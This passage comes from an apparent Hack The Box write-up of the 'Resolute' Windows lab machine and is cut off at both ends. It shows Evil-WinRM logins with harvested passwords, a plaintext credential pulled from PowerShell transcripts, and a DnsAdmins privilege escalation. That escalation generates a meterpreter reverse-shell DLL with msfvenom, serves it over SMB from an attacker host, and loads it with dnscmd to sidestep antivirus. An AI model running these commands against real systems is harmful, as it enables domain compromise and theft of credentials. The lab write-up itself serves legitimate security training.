class="function">‚ùØ</span></span><br></pre></td></tr></table></figure><p>looks easy right ? The password is belong to user <code>melanie</code> now using <code>Evil-WinRM</code> i will try to login it again.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> evil-winrm <span class="keyword">on</span> ÓÇ† master via üíé v2<span class="number">.7</span><span class="number">.0</span> </span><br><span class="line">‚ùØ ./evil-winrm.rb -i <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span> -u melanie -p Welcome123!</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2<span class="number">.3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; whoami</span><br><span class="line">megabank\melanie</span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt;</span><br></pre></td></tr></table></figure><p>This one of the easiest <code>user</code> part I experienced, now let‚Äôs grab the <code>user.txt</code> then move to privilege escalation.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; cd ../Desktop</span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Desktop&gt; Get-Content <span class="string">"user.txt"</span> | Measure-Object -Character -Word</span><br><span class="line"></span><br><span class="line">Lines Words Characters Property</span><br><span class="line">----- ----- ---------- --------</span><br><span class="line">          <span class="number">1</span>         <span class="number">32</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Desktop&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Transfer-file-with-SAMBA"><a href="#Transfer-file-with-SAMBA" class="headerlink" title="Transfer file with SAMBA"></a>Transfer file with SAMBA</h3><p>the enumeration starts again, i try to transfer first <code>winPEAS.exe</code> it is similar to <code>LinEnum.sh</code> for Linux kernel, it helps penetration testers to find some useful info that they can use for privilege escalation so first i setup my <code>smb</code> configuration.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">[global]</span><br><span class="line">workgroup = WORKGROUP</span><br><span class="line">server string - Samba Server %v</span><br><span class="line">netbios name = Payas0</span><br><span class="line">security = user</span><br><span class="line">map to guest = bad user</span><br><span class="line">name to resolve order = bcast host</span><br><span class="line">dns proxy = no</span><br><span class="line"><span class="built_in">bind</span> interfaces only = yes</span><br><span class="line"></span><br><span class="line">[medz]</span><br><span class="line">path = /root/htb/boxes/Resolute/</span><br><span class="line">writable = no</span><br><span class="line">guest ok = yes</span><br><span class="line">guest only = yes</span><br><span class="line"><span class="built_in">read</span> only = yes</span><br><span class="line">directory mode = 0555</span><br><span class="line">force user = nobody</span><br></pre></td></tr></table></figure><p>then start service :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Resolute </span><br><span class="line">‚ùØ smbd service restart</span><br></pre></td></tr></table></figure><p>now copy the <code>winPEAS.exe</code> with samba</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; copy \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\medz\winPEAS.exe</span><br></pre></td></tr></table></figure><p>but this one failed me. The machine has a <code>Anti-virus</code> it always disconnect me when I try to transfer a file like <code>nc.exe</code> or <code>winPEAS</code> so let‚Äôs do another thing‚Äô enumerate the directories.</p><h3 id="Hidden-directories"><a href="#Hidden-directories" class="headerlink" title="Hidden directories"></a>Hidden directories</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\melanie\Documents&gt; cd /</span><br><span class="line">*Evil-WinRM* PS C:\&gt; ls -hidden</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d--hs-        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">40</span> AM                $RECYCLE.BIN</span><br><span class="line">d--hsl        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">17</span> AM                Documents and Settings</span><br><span class="line">d--h--        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">48</span> AM                ProgramData</span><br><span class="line">d--h--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">32</span> AM                PSTranscripts</span><br><span class="line">d--hs-        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>  <span class="number">10</span>:<span class="number">17</span> AM                Recovery</span><br><span class="line">d--hs-        <span class="number">9</span>/<span class="number">25</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">25</span> AM                System Volume Information</span><br><span class="line">-arhs-       <span class="number">11</span>/<span class="number">20</span>/<span class="number">2016</span>   <span class="number">5</span>:<span class="number">59</span> PM         <span class="number">389408</span> bootmgr</span><br><span class="line">-a-hs-        <span class="number">7</span>/<span class="number">16</span>/<span class="number">2016</span>   <span class="number">6</span>:<span class="number">10</span> AM              <span class="number">1</span> BOOTNXT</span><br><span class="line">-a-hs-        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">3</span>:<span class="number">15</span> PM      <span class="number">402653184</span> pagefile.sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt;</span><br></pre></td></tr></table></figure><p>The <code>PSTranscripts</code> is very interesting because that is not a default file of a windows. so looking inside of that folder :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\&gt; cd PSTranscripts</span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; dir</span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; ls -hidden</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\PSTranscripts</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">d--h--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">45</span> AM                <span class="number">20191203</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt;</span><br></pre></td></tr></table></figure><p><code>dir</code> command will not show what‚Äôs really inside of the folder so I use <code>ls -hidden</code> to show the hidden files. and there‚Äôs another folder <code>20191203</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts&gt; cd <span class="number">20191203</span></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\<span class="number">20191203</span>&gt; ls -hidden</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\PSTranscripts\<span class="number">20191203</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line">-arh--        <span class="number">12</span>/<span class="number">3</span>/<span class="number">2019</span>   <span class="number">6</span>:<span class="number">45</span> AM           <span class="number">3732</span> PowerShell_transcript.RESOLUTE.OJuoBGhU<span class="number">.20191203063201</span>.txt</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\<span class="number">20191203</span>&gt;</span><br></pre></td></tr></table></figure><p>very interesting ! let‚Äôs see what‚Äôs inside of that text file.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\<span class="number">20191203</span>&gt; more PowerShell_transcript.RESOLUTE.OJuoBGhU<span class="number">.20191203063201</span>.txt</span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: <span class="number">20191203063201</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span><span class="number">.14393</span><span class="number">.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding</span><br><span class="line">Process ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span><span class="number">.30319</span><span class="number">.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063455</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;TerminatingError(): <span class="string">"System error."</span></span><br><span class="line">&gt;&gt; CommandInvocation(Invoke-Expression): <span class="string">"Invoke-Expression"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Invoke-Expression): name=<span class="string">"Command"</span>; <span class="keyword">value</span>=<span class="string">"-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'&gt; ')</span></span><br><span class="line"><span class="string">if (!$?) &#123; if($LASTEXITCODE) &#123; exit $LASTEXITCODE &#125; else &#123; exit 1 &#125; &#125;"</span></span><br><span class="line">&gt;&gt; CommandInvocation(Out-String): <span class="string">"Out-String"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Out-String): name=<span class="string">"Stream"</span>; <span class="keyword">value</span>=<span class="string">"True"</span></span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063455</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;ParameterBinding(Out-String): name=<span class="string">"InputObject"</span>; <span class="keyword">value</span>=<span class="string">"PS megabank\ryan@RESOLUTE Documents&gt; "</span></span><br><span class="line">PS megabank\ryan@RESOLUTE Documents&gt;</span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063515</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;CommandInvocation(Invoke-Expression): <span class="string">"Invoke-Expression"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Invoke-Expression): name=<span class="string">"Command"</span>; <span class="keyword">value</span>=<span class="string">"cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if (!$?) &#123; if($LASTEXITCODE) &#123; exit $LASTEXITCODE &#125; else &#123; exit 1 &#125; &#125;"</span></span><br><span class="line">&gt;&gt; CommandInvocation(Out-String): <span class="string">"Out-String"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Out-String): name=<span class="string">"Stream"</span>; <span class="keyword">value</span>=<span class="string">"True"</span></span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: <span class="number">20191203063515</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span><span class="number">.14393</span><span class="number">.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding</span><br><span class="line">Process ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span><span class="number">.30319</span><span class="number">.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">**********************</span><br><span class="line">**********************</span><br><span class="line">Command start time: <span class="number">20191203063515</span></span><br><span class="line">**********************</span><br><span class="line">PS&gt;CommandInvocation(Out-String): <span class="string">"Out-String"</span></span><br><span class="line">&gt;&gt; ParameterBinding(Out-String): name=<span class="string">"InputObject"</span>; <span class="keyword">value</span>=<span class="string">"The syntax of this command is:"</span></span><br><span class="line">cmd : The syntax of <span class="keyword">this</span> command <span class="keyword">is</span>:</span><br><span class="line">At line:<span class="number">1</span> <span class="keyword">char</span>:<span class="number">1</span></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">cmd : The syntax of <span class="keyword">this</span> command <span class="keyword">is</span>:</span><br><span class="line">At line:<span class="number">1</span> <span class="keyword">char</span>:<span class="number">1</span></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br><span class="line">+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line">    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException</span><br><span class="line">    + FullyQualifiedErrorId : NativeCommandError</span><br><span class="line">**********************</span><br><span class="line">Windows PowerShell transcript start</span><br><span class="line">Start time: <span class="number">20191203063515</span></span><br><span class="line">Username: MEGABANK\ryan</span><br><span class="line">RunAs User: MEGABANK\ryan</span><br><span class="line">Machine: RESOLUTE (Microsoft Windows NT <span class="number">10.0</span><span class="number">.14393</span><span class="number">.0</span>)</span><br><span class="line">Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding</span><br><span class="line">Process ID: <span class="number">2800</span></span><br><span class="line">PSVersion: <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">PSEdition: Desktop</span><br><span class="line">PSCompatibleVersions: <span class="number">1.0</span>, <span class="number">2.0</span>, <span class="number">3.0</span>, <span class="number">4.0</span>, <span class="number">5.0</span>, <span class="number">5.1</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">BuildVersion: <span class="number">10.0</span><span class="number">.14393</span><span class="number">.2273</span></span><br><span class="line">CLRVersion: <span class="number">4.0</span><span class="number">.30319</span><span class="number">.42000</span></span><br><span class="line">WSManStackVersion: <span class="number">3.0</span></span><br><span class="line">PSRemotingProtocolVersion: <span class="number">2.3</span></span><br><span class="line">SerializationVersion: <span class="number">1.1</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">**********************</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\PSTranscripts\<span class="number">20191203</span>&gt;</span><br></pre></td></tr></table></figure><p>looking at this I got another user <code>ryan</code> and his possible password <code>Serv3r4Admin4cc123!</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!</span><br></pre></td></tr></table></figure><p>Now from <code>melanie</code> i switch to user <code>ryan</code> and starts the enumeration again.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> evil-winrm <span class="keyword">on</span> ÓÇ† master via üíé v2<span class="number">.7</span><span class="number">.0</span> </span><br><span class="line">‚ùØ ./evil-winrm.rb -i <span class="number">10.10</span><span class="number">.10</span><span class="number">.169</span> -u ryan -p <span class="string">'Serv3r4Admin4cc123!'</span> -e . -s .</span><br><span class="line"></span><br><span class="line">Evil-WinRM shell v2<span class="number">.3</span></span><br><span class="line"></span><br><span class="line">Info: Establishing connection to remote endpoint</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Abusing-DNSAdmins-privilege-for-escalation-in-Active-Directory"><a href="#Abusing-DNSAdmins-privilege-for-escalation-in-Active-Directory" class="headerlink" title="Abusing DNSAdmins privilege for escalation in Active Directory"></a>Abusing DNSAdmins privilege for escalation in Active Directory</h3><p>Now let‚Äôs start to enumerate it again i checked it with <code>whoami /all</code></p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; whoami /all</span><br><span class="line"></span><br><span class="line">USER INFORMATION</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">User Name     SID</span><br><span class="line">============= ==============================================</span><br><span class="line">megabank\ryan S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1392959593</span><span class="number">-3013219662</span><span class="number">-3596683436</span><span class="number">-1105</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GROUP INFORMATION</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">Group Name                                 Type             SID                                            Attributes</span><br><span class="line">========================================== ================ ============================================== ===============================================================</span><br><span class="line">Everyone                                   Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-1</span><span class="number">-0</span>                                        Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">BUILTIN\Users                              Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-32</span><span class="number">-545</span>                                   Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">BUILTIN\Pre-Windows <span class="number">2000</span> Compatible Access Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-32</span><span class="number">-554</span>                                   Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">BUILTIN\Remote Management Users            Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-32</span><span class="number">-580</span>                                   Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">NT AUTHORITY\NETWORK                       Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-2</span>                                        Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">NT AUTHORITY\Authenticated Users           Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-11</span>                                       Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">NT AUTHORITY\This Organization             Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-15</span>                                       Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">MEGABANK\Contractors                       Group            S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1392959593</span><span class="number">-3013219662</span><span class="number">-3596683436</span><span class="number">-1103</span> Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">MEGABANK\DnsAdmins                         Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1392959593</span><span class="number">-3013219662</span><span class="number">-3596683436</span><span class="number">-1101</span> Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span>, Local Group</span><br><span class="line">NT AUTHORITY\NTLM Authentication           Well-known <span class="keyword">group</span> S<span class="number">-1</span><span class="number">-5</span><span class="number">-64</span><span class="number">-10</span>                                    Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span></span><br><span class="line">Mandatory Label\Medium Mandatory Level     Label            S<span class="number">-1</span><span class="number">-16</span><span class="number">-8192</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PRIVILEGES INFORMATION</span><br><span class="line">----------------------</span><br><span class="line"></span><br><span class="line">Privilege Name                Description                    State</span><br><span class="line">============================= ============================== =======                                                                                                                      </span><br><span class="line">SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                                                                                      </span><br><span class="line">SeChangeNotifyPrivilege       Bypass traverse checking       Enabled                                                                                                                      </span><br><span class="line">SeIncreaseWorkingSetPrivilege Increase a process working <span class="keyword">set</span> Enabled                                                                                                                      </span><br><span class="line">                                                                                                                                                                                          </span><br><span class="line">                                                                                                                                                                                          </span><br><span class="line">USER CLAIMS INFORMATION                                                                                                                                                                   </span><br><span class="line">-----------------------                                                                                                                                                                   </span><br><span class="line"></span><br><span class="line">User claims unknown.</span><br><span class="line"></span><br><span class="line">Kerberos support <span class="keyword">for</span> Dynamic Access Control <span class="keyword">on</span> <span class="keyword">this</span> device has been disabled.</span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure><p>looking at this line‚Äô <code>ryan</code> is part of <strong>DNSAdmin Group</strong>. This privilege is prone to privilege escation vulnerabilty which allows any user inside this grupo to make the DNS service load an arbitrary DLL correctly constructed.</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">MEGABANK\DnsAdmins                         Alias            S<span class="number">-1</span><span class="number">-5</span><span class="number">-21</span><span class="number">-1392959593</span><span class="number">-3013219662</span><span class="number">-3596683436</span><span class="number">-1101</span> Mandatory <span class="keyword">group</span>, Enabled <span class="keyword">by</span> <span class="keyword">default</span>, Enabled <span class="keyword">group</span>, Local Group</span><br></pre></td></tr></table></figure><p>with this help of this <a href="http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html" target="_blank" rel="noopener">article</a> and this <a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise" target="_blank" rel="noopener">one</a> we can get the administrator from <code>DNS</code></p><h3 id="Creating-malicious-DLL"><a href="#Creating-malicious-DLL" class="headerlink" title="Creating malicious DLL"></a>Creating malicious DLL</h3><p>we know that the machine‚Äô have <code>anti-virus</code> so I can‚Äôt load a malicious file inside to get a reverse shell. so I tried to use <code>impacket-smbserver</code> to load my <code>dll</code> file from my operating system and bypass the av protection. so first I created a dll file with <code>msfvenom</code></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root in htb/boxes/Resolute </span><br><span class="line">‚ùØ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span> LPORT=<span class="number">9001</span> -a x64 -f dll &gt; main.dll</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">No encoder <span class="keyword">or</span> badchars specified, outputting raw payload</span><br><span class="line">Payload <span class="built_in">size</span>: <span class="number">510</span> bytes</span><br><span class="line">Final <span class="built_in">size</span> of dll file: <span class="number">5120</span> bytes</span><br><span class="line"></span><br><span class="line">root in htb/boxes/Resolute <span class="number">12</span>s</span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>Next i setup my <code>impacket-smbserver</code> in the path where my <code>dll</code> is loaded .</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root in htb/boxes/Resolute </span><br><span class="line">‚ùØ python3 /usr/share/doc/python3-impacket/examples/smbserver.py SHARE /root/htb/boxes/Resolute</span><br><span class="line">Impacket v0<span class="number">.9</span><span class="number">.20</span> - Copyright <span class="number">2019</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID <span class="number">4B</span>324FC8<span class="number">-1670</span><span class="number">-01</span>D3<span class="number">-1278</span><span class="number">-5</span>A47BF6EE188 V:<span class="number">3.0</span></span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID <span class="number">6B</span>FFD098-A112<span class="number">-3610</span><span class="number">-9833</span><span class="number">-46</span>C3F87E345A V:<span class="number">1.0</span></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Config file parsed</span><br></pre></td></tr></table></figure><h3 id="Setup-Impacket-smbserver"><a href="#Setup-Impacket-smbserver" class="headerlink" title="Setup Impacket-smbserver"></a>Setup Impacket-smbserver</h3><p>next is to load my <code>dll</code> file in the entry <code>serverlevelplugindll</code> in the box :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dnscmd /config /serverlevelplugindll \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\SHARE\main.dll</span><br><span class="line"></span><br><span class="line">Registry property serverlevelplugindll successfully reset.</span><br><span class="line">Command completed successfully.</span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure><p>to make sure that i successfully connect it we can checked it with this command :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt; dir \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\SHARE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\<span class="number">10.10</span><span class="number">.14</span><span class="number">.187</span>\SHARE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line">----                -------------         ------ ----</span><br><span class="line"></span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">4</span>:<span class="number">36</span> PM             <span class="number">12</span> password.txt</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">31</span>/<span class="number">2020</span>   <span class="number">5</span>:<span class="number">13</span> AM           <span class="number">5120</span> main.dll</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">4</span>:<span class="number">03</span> PM           <span class="number">3512</span> nmap-Resolute</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">4</span>:<span class="number">32</span> PM            <span class="number">154</span> users.txt</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">7</span>:<span class="number">51</span> PM          <span class="number">59392</span> nc.exe</span><br><span class="line">-a----        <span class="number">5</span>/<span class="number">30</span>/<span class="number">2020</span>   <span class="number">5</span>:<span class="number">18</span> PM         <span class="number">241664</span> winPEAS.exe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">*Evil-WinRM* PS C:\Users\ryan\Documents&gt;</span><br></pre></td></tr></table></figure><p>Success ! the machine has connected with my operating system as they can view my files to the path where i set my <code>SHARE</code> my <code>impacket-smbserver</code> is also responding.</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">root in htb/boxes/Resolute </span><br><span class="line">‚ùØ python3 /usr/share/doc/python3-impacket/examples/smbserver.py SHARE /root/htb/boxes/Resolute</span><br><span class="line">Impacket v0<span class="number">.9</span><span class="number">.20</span> - Copyright <span class="number">2019</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Config file parsed</span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID <span class="number">4B</span>324FC8<span class="number">-1670</span><span class="number">-01</span>D3<span class="number">-1278</span><span class="number">-5</span>A47BF6EE188 V:<span class="number">3.0</span></span><br><span class="line">[*] Callback added <span class="keyword">for</span> UUID <span class="number">6B</span>FFD098-A112<span class="number">-3610</span><span class="number">-9833</span><span class="number">-46</span>C3F87E345A V:<span 